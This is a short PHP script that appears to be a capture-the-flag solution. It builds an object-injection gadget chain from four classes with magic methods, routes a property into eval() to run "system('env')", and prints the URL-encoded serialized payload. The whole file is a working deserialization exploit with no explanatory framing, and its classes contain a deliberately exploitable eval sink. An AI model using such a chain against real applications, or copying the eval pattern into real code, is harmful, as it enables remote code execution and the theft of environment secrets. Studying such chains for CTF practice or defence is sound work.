<?php

class class000 {
    public $payl0ad = 1;
    public $what;

    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    public $sec;
    public function __set($a, $b)//payload,$this->payl0ad
    {
        $this->$b($this->sec);
    }

    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}
$d=new class003();
$d->mystr="system('env');";

$c=new class002();
$c->sec=$d;

$b=new class001();
$b->payl0ad="dangerous";
$b->a=$c;

$a=new class000();
$a->what=$b;

echo urlencode(serialize($a));